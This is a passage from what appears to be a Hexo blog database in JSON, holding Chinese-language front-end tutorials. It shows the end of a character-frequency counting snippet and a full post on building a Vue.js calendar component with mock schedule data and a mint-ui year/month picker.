<span class=\"comment\">// abcdefg000</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h2 id=\"获取字符串中出现最多的字符和次数\"><a href=\"#获取字符串中出现最多的字符和次数\" class=\"headerlink\" title=\"获取字符串中出现最多的字符和次数\"></a>获取字符串中出现最多的字符和次数</h2><ul>\n<li>将字符串变化一种格式：字符串的每一个字符作为对象的键，字符出现的次数作为值，这就形成一个新的对象。</li>\n<li>遍历这个对象，比较每一个键值对的值，取最大的键值对，即得到字符串出现最多的字符和出现的次数。</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">  <span class=\"comment\">/* 判断一个字符串中出现最多的字符和出现的次数 */</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> str = <span class=\"string\">'aabbccddd'</span>;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> obj = &#123;&#125;; <span class=\"comment\">/* 定义一个空的对象来接收结果 */</span></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; str.length; i++) &#123;</span><br><span class=\"line\">    <span class=\"comment\">/* charAt获取字符串的索引 */</span></span><br><span class=\"line\">    <span class=\"comment\">/* 判断obj是否存在一个为 obj[str.charAt(i)] 的键</span></span><br><span class=\"line\"><span class=\"comment\">       如果不存在，那么就添加这个键，并且赋值为 1 </span></span><br><span class=\"line\"><span class=\"comment\">       如果已经存在这个键，那么就给这个键的值加1 */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!obj[str.charAt(i)]) &#123;</span><br><span class=\"line\">      obj[str.charAt(i)] = <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      obj[str.charAt(i)]++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(obj);</span><br><span class=\"line\">  <span class=\"comment\">/* 假设一个为0的值 和 一个空的字符串来存放键</span></span><br><span class=\"line\"><span class=\"comment\">  for in 遍历obj对象 然后把每一个值和max对比</span></span><br><span class=\"line\"><span class=\"comment\">  然后获取最大的值max 和 最大值对应的键maxno */</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> max = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> maxno = <span class=\"string\">''</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> k <span class=\"keyword\">in</span> obj) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (obj[k] &gt; max) &#123;</span><br><span class=\"line\">      max = obj[k];</span><br><span class=\"line\">      maxno = k;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(max + <span class=\"string\">' '</span> + maxno);</span><br><span class=\"line\">&lt;<span class=\"regexp\">/script&gt;</span></span><br></pre></td></tr></table></figure>\n"},{"title":"日历组件","abbrlink":"3b43e344","date":"2019-06-06T16:23:20.000Z","_content":"# 日历组件\n\n## 效果\n\n> 忙活了大概三天，做出来非常开心，心里美滋滋的\n>\n> 其实很早就想自己写一个日历组件了，只怪自己懒散\n>\n> 现在写一下思路过程，记录一下\n\n  ![calendar](封装日历组件/calendar.gif)\n\n## 需求\n\n1、实现一个日历组件，如图：\n\n![20190606223710](封装日历组件/20190606223710.png)\n\n2、显示某天的事项：\n\n![1559832421561](封装日历组件/1559832421561.png)\n\n3、事项是模拟父组件请求接口返回的，数据格式如下：\n\n```js\n[\n        {\n          id: '232',\n          date: '2019-06-01',\n          info: '我要去吃大餐'\n        },\n        {\n          id: '292',\n          date: '2019-06-06',\n          info: '我要去吃大餐'\n        },\n        {\n          id: '292',\n          date: '2019-06-07',\n          info: '我要去吃大餐'\n        },\n        {\n          id: '369',\n          date: '2019-06-30',\n          info: '我要去吃大餐'\n        }\n      ]\n```\n\n4、把事项添加到日历组件中，数据格式如下：\n\n![2019-06-06_22-54-19](封装日历组件/2019-06-06_22-54-19.png)\n\n## 代码解析\n\n**package.json文件：**\n\n父组件页面：\n\n```html\n<template>\n  <div class=\"test-container\">\n    <h1>Test页面，测试组件</h1>\n    <!-- 日历 -->\n    <calendar v-if=\"calendarVisible\" @getDateInfo=\"getDateInfo\" :propsInfoList=\"propsInfoList\" :propsTime=\"propsTime\"></calendar>\n  </div>\n</template>\n\n<script>\nimport calendar from '@/components/Calendar/Calendar.vue'\nexport default {\n  name: 'test',\n  components: {\n    \"calendar\": calendar\n  },\n  data() {\n    return {\n      calendarVisible: true,\n      propsTime: '',\n      propsInfoList: '',\n      middle: [\n        {\n          id: '232',\n          date: '2019-06-01',\n          info: '我要去吃大餐'\n        },\n        {\n          id: '292',\n          date: '2019-06-06',\n          info: '我要去吃大餐'\n        },\n        {\n          id: '292',\n          date: '2019-06-07',\n          info: '我要去吃大餐'\n        },\n        {\n          id: '369',\n          date: '2019-06-30',\n          info: '我要去吃大餐'\n        }\n      ]\n    }\n  },\n  created() {\n    // 模拟首屏ajax请求，将当月数据传入组件中\n    this.propsInfoList = JSON.stringify(this.middle)\n    this.propsTime = this.getToday()\n  },\n  mounted() {\n    window.alert('测试时间为19年 5、6、7月，完成是在6月')\n  },\n  methods: {\n    // 格式化当前日期 YYYY-MM-DD\n    getToday() {\n      let nowDate = new Date()\n      let yy = nowDate.getFullYear().toString()\n      let mm = (nowDate.getMonth() + 1 + '').padStart(2,'0')\n      let dd = (nowDate.getDate() + '').padStart(2,'0')\n      // let hh = nowDate.getHours().toString().padStart(2,'0')\n      // let mt = (nowDate.getMinutes() + '').padStart(2,'0')\n      // let ss = (nowDate.getSeconds() + '').padStart(2,'0')\n      return `${yy}-${mm}-${dd}` // -${hh}-${mt}-${ss}\n    },\n    // 组件传值\n    getDateInfo(year, month) {\n      let _this = this\n      _this.propsTime = `${year}-${month}`\n      _this.calendarVisible = false\n      // 模拟点击选取其他年月的ajax，假数据，只能显示19年 5 6 7三个月\n      setTimeout(() => {\n        _this.propsInfoList = []\n        let middle\n        if(month == '05') {\n          middle  = [\n            {\n              id: '232',\n              date: '2019-05-10',\n              info: '我要去吃小餐'\n            }\n          ]\n        } else if (month == '06') {\n          middle = _this.middle\n        } else if (month == '07') {\n          middle  = [\n            {\n              id: '232',\n              date: '2019-07-10',\n              info: '我要去吃小餐'\n            }\n          ]\n        } else {\n          middle = ''\n        }\n        _this.propsInfoList = JSON.stringify(middle)\n        _this.calendarVisible = true\n      }, 100)\n    }\n  }\n}\n</script>\n\n```\n\n\n\n日历子组件：\n\n```html\n<template>\n  <div class=\"calendar-container\">\n    // 日历标题\n    <h1>calendar</h1>\n    // 显示本月日期 2019-6，可点击\n    <div class=\"show-date\" @click=\"clickData\">{{showDate}}</div>\n    // 今天的日期 2019-6-6\n    <div class=\"now-time\">今日：{{exactTime}}</div>\n    // 日历组件\n    <div class=\"calendar\">\n    // 日历组件头部\n      <ul class=\"calendar-header\">\n        <li>日</li>\n        <li>一</li>\n        <li>二</li>\n        <li>三</li>\n        <li>四</li>\n        <li>五</li>\n        <li>六</li>\n      </ul>\n    // 日历组件主体\n      <ul class=\"calendar-body\">\n        <li class=\"calendar-row\" v-for=\"(item, index) in JSON.parse(calendarData)\" :key=\"index\">\n          // 注意给 不同的日子加类名\n          // 周末：weekend  工作日：weekday\n          // 过去的事项 already-time 今天的事项 exact-time 将来的事项 soon-time\n          // 给有事项的日子实现点击弹框，显示这天的事项内容\n          <span v-for=\"(subItem, subIndex) in item\" :class=\"[subIndex == 0 || subIndex == 6? 'weekend': 'weekday', subItem.type == '1'? 'exact-time': '', subItem.type == '0'? 'already-time': '', subItem.type == '2'? 'soon-time': '']\" @click=\"showInfo(subItem)\" :key=\"subIndex\">\n            {{subItem.date}}\n          </span>\n        </li>\n      </ul>\n    </div>\n    // popup 和 picker 搭配，实现 年月 选择   mint-ui 库\n    <mt-popup v-model=\"popupVisible\" position=\"bottom\">\n      <mt-picker :slots=\"slots\" :showToolbar=\"true\" :visibleItemCount=\"5\" :itemHeight=\"itemsHeight\" ref=\"picker\">\n        <img src=\"@/assets/images/picker_cancel.png\" class=\"picker_cancel\" v-on:click=\"cancelFunc()\">\n        <img src =\"@/assets/images/picker_sure.png\" class=\"picker_sure\" v-on:click=\"sureFunc()\">\n      </mt-picker>\n    </mt-popup>\n  </div>\n</template>\n\n```\n\n日历子组件逻辑：\n\n```js\nimport { MessageBox } from 'mint-ui'\nexport default {\n  name: \"calendar\",\n  props: {\n    propsTime: String,\n    propsInfoList: String\n  },\n  data() {\n    return {\n      // 接收父组件传值 '2019-06'\n      time: '',\n      // 接收父组件数据列表\n      infoList: '',\n      // 日历组件\n      calendarData: [],\n      // 页面展示的 '年-月'\n      showDate: '',\n      // 当前的 '年-月-日'\n      exactTime: '',\n      // picker 高度\n      itemsHeight: 95 * window.screen.height / 1334,\n      // pupop 显示\n      popupVisible: false,\n      // picker 数据\n      slots: []\n    }\n  },\n  created() {\n    // 拿到父组件的 list\n    this.infoList = this.propsInfoList\n    // 拿到父组件的 '2019-06'\n    this.time = this.propsTime.split('-')\n    // 获取今天 '2019-06-06'\n    const date = this.getToday()\n    this.exactTime = date.slice(0,3).join('-')\n    // 日历组件\n    this.getCalendar(...(this.time))\n    // 组装 picker 数组\n    this.getSlotsArray(...(date.slice(0,2)))\n  },\n  methods: {\n    // 日历组件\n    getCalendar(year, month) {\n      let _this = this\n      // 转存当天 '2019-06-06'\n      const rightNow = _this.exactTime\n      // 拼接 显示日历上的年月 '2019-05'\n      _this.showDate = `${year}-${month}`\n      // 获取当月的第一天\n      const firstDate = new Date(year, month - 1, 1)\n      // 获取第一天周几\n      const firstDay = firstDate.getDay()\n      // 判断是否为闰年\n      const isLeapYear = year % 100 == 0? year % 400 == 0? 1: 0: year % 4 == 0 ? 1: 0\n      // 获取今年每个月的天数\n      const monthArray = [31, 28 + isLeapYear, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]\n      // 计算星期的行数\n      const weeekLines =Math.ceil((monthArray[month - 1] + firstDay)/7)\n      let calendar = []\n      for(let i = 0; i < weeekLines; i++) {\n        let weeekLinesInfo = []\n        for(let j = 0; j < 7; j++) {\n          // 计算每个单元格的序号\n          const cellNo = i * 7 + j\n          // 计算每个单元格应该填充的日期\n          const datePerLine = cellNo - firstDay + 1\n          // 排除空白格\n          if(datePerLine <= 0 || datePerLine > monthArray[month - 1]) {\n            // 不存在的显示为 null 和 ''\n            let outOfMonth = {\n              \"type\" : 'null',\n              \"date\" : ''\n            }\n            weeekLinesInfo[j] = outOfMonth\n          } else {\n            let day = (datePerLine + '').padStart(2,'0')\n            let inOfMonth = {\n              \"type\" : '',\n              \"date\" : day,\n              \"isDone\": '',\n              \"infor\": ''\n            }\n            // 今天背景变成一个红圈,这是今天 => rightNow\n            const propsDate = `${year}-${month}-${day}`\n            // 比较每月的今天\n            if(propsDate == rightNow){\n              inOfMonth.type = \"1\"\n            }\n            const reservations = JSON.parse(_this.infoList)\n            // 将 父组件传的 list 赋值在日历上\n            // 预定列表 和 当月每一天比较\n            for(let k = 0; k < reservations.length; k++) {\n              if(propsDate == reservations[k].date){\n                // inOfMonth.type = \"1\"\n                inOfMonth.infor = reservations[k].info\n                if(rightNow == reservations[k].date) {\n                  inOfMonth.type = \"1\"\n                  inOfMonth.isDone = \"doing\"\n                } else if (rightNow > reservations[k].date) {\n                  inOfMonth.type = \"0\"\n                  inOfMonth.isDone = \"pass\"\n                } else if (rightNow < reservations[k].date) {\n                  inOfMonth.type = \"2\"\n                  inOfMonth.isDone = \"will\"\n                }\n              }\n            }\n            weeekLinesInfo[j] = inOfMonth\n          }\n        }\n        calendar.push(weeekLinesInfo)\n      }\n      window.console.log(calendar)\n      // 即将遍历二维数组\n      _this.calendarData = JSON.stringify(calendar)\n    },\n    // 格式化当前日期 YYYY-MM-DD\n    getToday() {\n      let nowDate = new Date()\n      let yy = nowDate.getFullYear().toString()\n      let mm = (nowDate.getMonth() + 1 + '').padStart(2,'0')\n      let dd = (nowDate.getDate() + '').padStart(2,'0')\n      let hh = nowDate.getHours().toString().padStart(2,'0')\n      let mt = (nowDate.getMinutes() + '').padStart(2,'0')\n      let ss = (nowDate.getSeconds() + '').padStart(2,'0')\n      return [yy, mm, dd, hh, mt, ss]\n      // return `${yy}-${mm}-${dd}-${hh}-${mt}-${ss}`\n    },\n    // 组装 picker 数组\n    getSlotsArray(year, month){\n      let _this = this\n      let yearArray = []\n      for(let i = -10 ; i <= 10 ; i ++){\n        yearArray.push(year - 1 + i)\n      }\n      let monthArray = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12]\n      let slots = [\n        {\n          values:yearArray,\n          className:\"slot1\",\n          defaultIndex: 11\n        },\n        {\n          values:monthArray,\n          className:\"slot2\",\n          defaultIndex:month - 1\n        }\n      ]\n      _this.slots = slots\n    },\n    // 显示日期弹窗\n    clickData(){\n      this.popupVisible = true\n    },\n    // 取消按钮\n    cancelFunc(){\n      this.popupVisible = false;\n    },\n    // 确认按钮\n    sureFunc() {\n      let _this = this\n      _this.popupVisible = false\n      const clickData = _this.$refs.picker.getValues()\n      const year = clickData[0] + ''\n      const month = (clickData[1] + '').padStart(2,'0')\n      const day = _this.time[2]\n      _this.getDateInfo(year, month)\n      _this.getCalendar(year, month)\n    },\n    // 调用父组件定义的方法\n    getDateInfo(year, month) {\n      this.$emit('getDateInfo', year, month)\n    },\n    // 点击展示某天的事项信息\n    showInfo(info) {\n      let _this = this\n      const infor = info\n      if(infor.infor) {\n        const [year, month] = _this.showDate.split('-')\n        console.log(year, month, info)\n        const titleDate = `${year}-${month}-${info.date}`\n        const preview = info.infor\n        MessageBox({\n          title: titleDate,\n          message: preview,\n          showCancelButton: false,\n          closeOnClickModal: true\n        })\n      }\n    }\n  }\n}\n\n```\n\n其他：为了减少篇幅，省略样式\n\n[github地址](https://github.com/houfee)\n","source":"_posts/封装日历组件.md","raw":"---\ntitle: 日历组件\ncategories:\n  - vue.js\ntags:\n  - vue.js\nabbrlink: 3b43e344\ndate: 2019-06-07 00:23:20\n---\n# 日历组件\n\n## 效果\n\n> 忙活了大概三天，做出来非常开心，心里美滋滋的\n>\n> 其实很早就想自己写一个日历组件了，只怪自己懒散\n>\n> 现在写一下思路过程，记录一下\n\n  ![calendar](封装日历组件/calendar.gif)\n\n## 需求\n\n1、实现一个日历组件，如图：\n\n![20190606223710](封装日历组件/20190606223710.png)\n\n2、显示某天的事项：\n\n![1559832421561](封装日历组件/1559832421561.png)\n\n3、事项是模拟父组件请求接口返回的，数据格式如下：\n\n```js\n[\n        {\n          id: '232',\n          date: '2019-06-01',\n          info: '我要去吃大餐'\n        },\n        {\n          id: '292',\n          date: '2019-06-06',\n          info: '我要去吃大餐'\n        },\n        {\n          id: '292',\n          date: '2019-06-07',\n          info: '我要去吃大餐'\n        },\n        {\n          id: '369',\n          date: '2019-06-30',\n          info: '我要去吃大餐'\n        }\n      ]\n```\n\n4、把事项添加到日历组件中，数据格式如下：\n\n![2019-06-06_22-54-19](封装日历组件/2019-06-06_22-54-19.png)\n\n## 代码解析\n\n**package.json文件：**\n\n父组件页面：\n\n```html\n<template>\n  <div class=\"test-container\">\n    <h1>Test页面，测试组件</h1>\n    <!-- 日历 -->\n    <calendar v-if=\"calendarVisible\" @getDateInfo=\"getDateInfo\" :propsInfoList=\"propsInfoList\" :propsTime=\"propsTime\"></calendar>\n  </div>\n</template>\n\n<script>\nimport calendar from '@/components/Calendar/Calendar.vue'\nexport default {\n  name: 'test',\n  components: {\n    \"calendar\": calendar\n  },\n  data() {\n    return {\n      calendarVisible: true,\n      propsTime: '',\n      propsInfoList: '',\n      middle: [\n        {\n          id: '232',\n          date: '2019-06-01',\n          info: '我要去吃大餐'\n        },\n        {\n          id: '292',\n          date: '2019-06-06',\n          info: '我要去吃大餐'\n        },\n        {\n          id: '292',\n          date: '2019-06-07',\n          info: '我要去吃大餐'\n        },\n        {\n          id: '369',\n          date: '2019-06-30',\n          info: '我要去吃大餐'\n        }\n      ]\n    }\n  },\n  created() {\n    // 模拟首屏ajax请求，将当月数据传入组件中\n    this.propsInfoList = JSON.stringify(this.middle)\n    this.propsTime = this.getToday()\n  },\n  mounted() {\n    window.alert('测试时间为19年 5、6、7月，完成是在6月')\n  },\n  methods: {\n    // 格式化当前日期 YYYY-MM-DD\n    getToday() {\n      let nowDate = new Date()\n      let yy = nowDate.getFullYear().toString()\n      let mm = (nowDate.getMonth() + 1 + '').padStart(2,'0')\n      let dd = (nowDate.getDate() + '').padStart(2,'0')\n      // let hh = nowDate.getHours().toString().padStart(2,'0')\n      // let mt = (nowDate.getMinutes() + '').padStart(2,'0')\n      // let ss = (nowDate.getSeconds() + '').padStart(2,'0')\n      return `${yy}-${mm}-${dd}` // -${hh}-${mt}-${ss}\n    },\n    // 组件传值\n    getDateInfo(year, month) {\n      let _this = this\n      _this.propsTime = `${year}-${month}`\n      _this.calendarVisible = false\n      // 模拟点击选取其他年月的ajax，假数据，只能显示19年 5 6 7三个月\n      setTimeout(() => {\n        _this.propsInfoList = []\n        let middle\n        if(month == '05') {\n          middle  = [\n            {\n              id: '232',\n              date: '2019-05-10',\n              info: '我要去吃小餐'\n            }\n          ]\n        } else if (month == '06') {\n          middle = _this.middle\n        } else if (month == '07') {\n          middle  = [\n            {\n              id: '232',\n              date: '2019-07-10',\n              info: '我要去吃小餐'\n            }\n          ]\n        } else {\n          middle = ''\n        }\n        _this.propsInfoList = JSON.stringify(middle)\n        _this.calendarVisible = true\n      }, 100)\n    }\n  }\n}\n</script>\n\n```\n\n\n\n日历子组件：\n\n```html\n<template>\n  <div class=\"calendar-container\">\n    // 日历标题\n    <h1>calendar</h1>\n    // 显示本月日期 2019-6，可点击\n    <div class=\"show-date\" @click=\"clickData\">{{showDate}}</div>\n    // 今天的日期 2019-6-6\n    <div class=\"now-time\">今日：{{exactTime}}</div>\n    // 日历组件\n    <div class=\"calendar\">\n    // 日历组件头部\n      <ul class=\"calendar-header\">\n        <li>日</li>\n        <li>一</li>\n        <li>二</li>\n        <li>三</li>\n        <li>四</li>\n        <li>五</li>\n        <li>六</li>\n      </ul>\n    // 日历组件主体\n      <ul class=\"calendar-body\">\n        <li class=\"calendar-row\" v-for=\"(item, index) in JSON.parse(calendarData)\" :key=\"index\">\n          // 注意给 不同的日子加类名\n          // 周末：weekend  工作日：weekday\n          // 过去的事项 already-time 今天的事项 exact-time 将来的事项 soon-time\n          // 给有事项的日子实现点击弹框，显示这天的事项内容\n          <span v-for=\"(subItem, subIndex) in item\" :class=\"[subIndex == 0 || subIndex == 6? 'weekend': 'weekday', subItem.type == '1'? 'exact-time': '', subItem.type == '0'? 'already-time': '', subItem.type == '2'? 'soon-time': '']\" @click=\"showInfo(subItem)\" :key=\"subIndex\">\n            {{subItem.date}}\n          </span>\n        </li>\n      </ul>\n    </div>\n    // popup 和 picker 搭配，实现 年月 选择   mint-ui 库\n    <mt-popup v-model=\"popupVisible\" position=\"bottom\">\n      <mt-picker :slots=\"slots\" :showToolbar=\"true\" :visibleItemCount=\"5\" :itemHeight=\"itemsHeight\" ref=\"picker\">\n        <img src=\"@/assets/images/picker_cancel.png\" class=\"picker_cancel\" v-on:click=\"cancelFunc()\">\n        <img src =\"@/assets/images/picker_sure.png\" class=\"picker_sure\" v-on:click=\"sureFunc()\">\n      </mt-picker>\n    </mt-popup>\n  </div>\n</template>\n\n```\n\n日历子组件逻辑：\n\n```js\nimport { MessageBox } from 'mint-ui'\nexport default {\n  name: \"calendar\",\n  props: {\n    propsTime: String,\n    propsInfoList: String\n  },\n  data() {\n    return {\n      // 接收父组件传值 '2019-06'\n      time: '',\n      // 接收父组件数据列表\n      infoList: '',\n      // 日历组件\n      calendarData: [],\n      // 页面展示的 '年-月'\n      showDate: '',\n      // 当前的 '年-月-日'\n      exactTime: '',\n      // picker 高度\n      itemsHeight: 95 * window.screen.height / 1334,\n      // pupop 显示\n      popupVisible: false,\n      // picker 数据\n      slots: []\n    }\n  },\n  created() {\n    // 拿到父组件的 list\n    this.infoList = this.propsInfoList\n    // 拿到父组件的 '2019-06'\n    this.time = this.propsTime.split('-')\n    // 获取今天 '2019-06-06'\n    const date = this.getToday()\n    this.exactTime = date.slice(0,3).join('-')\n    // 日历组件\n    this.getCalendar(...(this.time))\n    // 组装 picker 数组\n    this.getSlotsArray(...(date.slice(0,2)))\n  },\n  methods: {\n    // 日历组件\n    getCalendar(year, month) {\n      let _this = this\n      // 转存当天 '2019-06-06'\n      const rightNow = _this.exactTime\n      // 拼接 显示日历上的年月 '2019-05'\n      _this.showDate = `${year}-${month}`\n      // 获取当月的第一天\n      const firstDate = new Date(year, month - 1, 1)\n      // 获取第一天周几\n      const firstDay = firstDate.getDay()\n      // 判断是否为闰年\n      const isLeapYear = year % 100 == 0? year % 400 == 0? 1: 0: year % 4 == 0 ? 1: 0\n      // 获取今年每个月的天数\n      const monthArray = [31, 28 + isLeapYear, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]\n      // 计算星期的行数\n      const weeekLines =Math.ceil((monthArray[month - 1] + firstDay)/7)\n      let calendar = []\n      for(let i = 0; i < weeekLines; i++) {\n        let weeekLinesInfo = []\n        for(let j = 0; j < 7; j++) {\n          // 计算每个单元格的序号\n          const cellNo = i * 7 + j\n          // 计算每个单元格应该填充的日期\n          const datePerLine = cellNo - firstDay + 1\n          // 排除空白格\n          if(datePerLine <= 0 || datePerLine > monthArray[month - 1]) {\n            // 不存在的显示为 null 和 ''\n            let outOfMonth = {\n              \"type\" : 'null',\n              \"date\" : ''\n            }\n            weeekLinesInfo[j] = outOfMonth\n          } else {\n            let day = (datePerLine + '').padStart(2,'0')\n            let inOfMonth = {\n              \"type\" : '',\n              \"date\" : day,\n              \"isDone\": '',\n              \"infor\": ''\n            }\n            // 今天背景变成一个红圈,这是今天 => rightNow\n            const propsDate = `${year}-${month}-${day}`\n            // 比较每月的今天\n            if(propsDate == rightNow){\n              inOfMonth.type = \"1\"\n            }\n            const reservations = JSON.parse(_this.infoList)\n            // 将 父组件传的 list 赋值在日历上\n            // 预定列表 和 当月每一天比较\n            for(let k = 0; k < reservations.length; k++) {\n              if(propsDate == reservations[k].date){\n                // inOfMonth.type = \"1\"\n                inOfMonth.infor = reservations[k].info\n                if(rightNow == reservations[k].date) {\n                  inOfMonth.type = \"1\"\n                  inOfMonth.isDone = \"doing\"\n                } else if (rightNow > reservations[k].date) {\n                  inOfMonth.type = \"0\"\n                  inOfMonth.isDone = \"pass\"\n                } else if (rightNow < reservations[k].date) {\n                  inOfMonth.type = \"2\"\n                  inOfMonth.isDone = \"will\"\n                }\n              }\n            }\n            weeekLinesInfo[j] = inOfMonth\n          }\n        }\n        calendar.push(weeekLinesInfo)\n      }\n      window.console.log(calendar)\n      // 即将遍历二维数组\n      _this.calendarData = JSON.stringify(calendar)\n    },\n    // 格式化当前日期 YYYY-MM-DD\n    getToday() {\n      let nowDate = new Date()\n      let yy = nowDate.getFullYear().toString()\n      let mm = (nowDate.getMonth() + 1 + '').padStart(2,'0')\n      let dd = (nowDate.getDate() + '').padStart(2,'0')\n      let hh = nowDate.getHours().toString().padStart(2,'0')\n      let mt = (nowDate.getMinutes() + '').padStart(2,'0')\n      let ss = (nowDate.getSeconds() + '').padStart(2,'0')\n      return [yy, mm, dd, hh, mt, ss]\n      // return `${yy}-${mm}-${dd}-${hh}-${mt}-${ss}`\n    },\n    // 组装 picker 数组\n    getSlotsArray(year, month){\n      let _this = this\n      let yearArray = []\n      for(let i = -10 ; i <= 10 ; i ++){\n        yearArray.push(year - 1 + i)\n      }\n      let monthArray = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12]\n      let slots = [\n        {\n          values:yearArray,\n          className:\"slot1\",\n          defaultIndex: 11\n        },\n        {\n          values:monthArray,\n          className:\"slot2\",\n          defaultIndex:month - 1\n        }\n      ]\n      _this.slots = slots\n    },\n    // 显示日期弹窗\n    clickData(){\n      this.popupVisible = true\n    },\n    // 取消按钮\n    cancelFunc(){\n      this.popupVisible = false;\n    },\n    // 确认按钮\n    sureFunc() {\n      let _this = this\n      _this.popupVisible = false\n      const clickData = _this.$refs.picker.getValues()\n      const year = clickData[0] + ''\n      const month = (clickData[1] + '').padStart(2,'0')\n      const day = _this.time[2]\n      _this.getDateInfo(year, month)\n      _this.getCalendar(year, month)\n    },\n    // 调用父组件定义的方法\n    getDateInfo(year, month) {\n      this.$emit('getDateInfo', year, month)\n    },\n    // 点击展示某天的事项信息\n    showInfo(info) {\n      let _this = this\n      const infor = info\n      if(infor.infor) {\n        const [year, month] = _this.showDate.split('-')\n        console.log(year, month, info)\n        const titleDate = `${year}-${month}-${info.date}`\n        const preview = info.infor\n        MessageBox({\n          title: titleDate,\n          message: preview,\n          showCancelButton: false,\n          closeOnClickModal: true\n        })\n      }\n    }\n  }\n}\n\n```\n\n其他：为了减少篇幅，省略样式\n\n[github地址](https://github.com/houfee)\n","slug":"封装日历组件","published":1,"updated":"2020-06-18T07:09:21.438Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckclr4u5u0010qrwtf7d6s88i","content":"<h1 id=\"日历组件\"><a href=\"#日历组件\" class=\"headerlink\" title=\"日历组件\"></a>日历组件</h1><h2 id=\"效果\"><a href=\"#效果\" class=\"headerlink\" title=\"效果\"></a>效果</h2><blockquote>\n<p>忙活了大概三天，做出来非常开心，心里美滋滋的</p>\n<p>其实很早就想自己写一个日历组件了，只怪自己懒散</p>\n<p>现在写一下思路过程，记录一下</p>\n</blockquote>\n<p>  <img src=\"/view/posts/3b43e344/calendar.gif\" alt=\"calendar\"></p>\n<h2 id=\"需求\"><a href=\"#需求\" class=\"headerlink\" title=\"需求\"></a>需求</h2><p>1、实现一个日历组件，如图：</p>\n<p><img src=\"/view/posts/3b43e344/20190606223710.png\" alt=\"20190606223710\"></p>\n<p>2、显示某天的事项：</p>\n<p><img src=\"/view/posts/3b43e344/1559832421561.png\" alt=\"1559832421561\"></p>\n<p>3、事项是模拟父组件请求接口返回的，数据格式如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          id: <span class=\"string\">'232'</span>,</span><br><span class=\"line\">          date: <span class=\"string\">'2019-06-01'</span>,</span><br><span class=\"line\">          info: <span class=\"string\">'我要去吃大餐'</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          id: <span class=\"string\">'292'</span>,</span><br><span class=\"line\">          date: <span class=\"string\">'2019-06-06'</span>,</span><br><span class=\"line\">          info: <span class=\"string\">'我要去吃大餐'</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          id: <span class=\"string\">'292'</span>,</span><br><span class=\"line\">          date: <span class=\"string\">'2019-06-07'</span>,</span><br><span class=\"line\">          info: <span class=\"string\">'我要去吃大餐'</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          id: <span class=\"string\">'369'</span>,</span><br><span class=\"line\">          date: <span class=\"string\">'2019-06-30'</span>,</span><br><span class=\"line\">          info: <span class=\"string\">'我要去吃大餐'</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      ]</span><br></pre></td></tr></table></figure>\n<p>4、把事项添加到日历组件中，数据格式如下：</p>\n<p><img src=\"/view/posts/3b43e344/2019-06-06_22-54-19.png\" alt=\"2019-06-06_22-54-19\"></p>\n<h2 id=\"代码解析\"><a href=\"#代码解析\" class=\"headerlink\" title=\"代码解析\"></a>代码解析</h2><p><strong>package.json文件：</strong></p>\n<p>父组件页面：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span 